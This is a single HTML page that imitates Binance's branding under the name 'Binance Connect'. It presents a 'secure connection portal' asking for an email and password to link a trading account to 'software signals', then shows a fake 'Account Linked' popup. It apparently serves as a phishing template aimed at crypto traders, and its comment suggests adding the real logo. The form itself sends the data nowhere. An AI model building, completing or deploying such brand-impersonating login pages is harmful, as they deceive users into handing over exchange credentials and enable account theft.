<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Binance Connect</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial, Helvetica, sans-serif;
}

body{
background:#f5f6fa;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

/* TOP BINANCE HEADER */

.top{
position:absolute;
top:0;
left:0;
width:100%;
padding:18px 30px;

/* Binance yellow gradient */
background:linear-gradient(90deg,#fcd535,#f0b90b);
color:black;
font-weight:bold;
display:flex;
align-items:center;
gap:12px;
}

/* fake logo box (replace with real image if you want) */
.logo{
width:34px;
height:34px;
background:black;
border-radius:6px;
}

.container{
background:white;
width:380px;
padding:35px;
border-radius:14px;
box-shadow:0 15px 40px rgba(0,0,0,0.12);
}

h2{
margin-bottom:6px;
}

.subtitle{
margin-bottom:25px;
color:#555;
font-size:14px;
}

/* INPUTS */

input{
width:100%;
padding:14px;
margin-bottom:14px;
border-radius:8px;
border:1px solid #ddd;
font-size:15px;
}

/* BUTTON */

button{
width:100%;
padding:15px;
border:none;
border-radius:8px;
font-size:16px;
font-weight:bold;
cursor:pointer;

/* Binance yellow */
background:#fcd535;
}

button:hover{
background:#f0b90b;
}

/* SUCCESS POPUP */

.popup{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(0,0,0,0.45);
display:none;
justify-content:center;
align-items:center;
}

.popup-box{
background:white;
padding:40px;
border-radius:14px;
text-align:center;
animation:pop .35s ease;
}

@keyframes pop{
from{transform:scale(.6);opacity:0;}
to{transform:scale(1);opacity:1;}
}

</style>
</head>

<body>

<!-- HEADER -->
<div class="top">
<div class="logo"></div>
<div>Binance Connect</div>
</div>

<!-- FORM -->
<div class="container">

<h2>Connect Software Signals to your Trading Account</h2>

<div class="subtitle">
Secure connection portal
</div>

<form onsubmit="showPopup(event)">

<!-- EMAIL FIRST -->
<input type="email" placeholder="Email Address" required>

<!-- PASSWORD UNDER EMAIL -->
<input type="password" placeholder="Password" required>

<button type="submit">
Link Trading Account
</button>

</form>

</div>

<!-- SUCCESS POPUP -->
<div class="popup" id="popup">
<div class="popup-box">
<h2>âœ… Account Linked</h2>
<p>Connection successful.</p>
</div>
</div>

<script>

function showPopup(e){
e.preventDefault();
document.getElementById("popup").style.display="flex";
}

</script>

</body>
</html>
